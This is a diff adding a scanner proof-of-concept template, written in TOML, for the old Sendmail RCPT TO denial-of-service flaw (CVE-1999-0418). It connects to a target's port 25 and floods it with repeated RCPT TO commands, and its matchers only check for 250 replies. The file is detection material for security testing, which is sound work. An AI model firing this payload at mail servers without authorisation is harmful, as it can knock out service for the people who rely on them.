@@ -1,0 +1,38 @@
+[info]
+id = "POC-AVE-1999-0203"
+name = "CVE-1999-0418 Sendmail RCPT TO DoS PoC"
+author = "AVE"
+severity = "medium"
+tags = ["dos", "smtp", "sendmail", "rcpt-to"]
+description = "检测 Sendmail SMTP 服务器是否存在 CVE-1999-0418 拒绝服务漏洞，通过发送大量 RCPT TO 命令验证"
+vuln_id = ["CVE-1999-0418", "AVE-1999-0203"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "TCP"
+host = "{{target}}"
+port = 25
+read_timeout = 10
+send_payload = true
+payload = "HELO test\r\nMAIL FROM:<test@test.com>\r\n"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "banner"
+words = ["220", "250"]
+expect = true
+
+[[poc.requests]]
+method = "TCP"
+host = "{{target}}"
+port = 25
+read_timeout = 10
+send_payload = true
+payload = "RCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nRCPT TO:<a@b.com>\r\nQUIT\r\n"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [250]
+expect = true
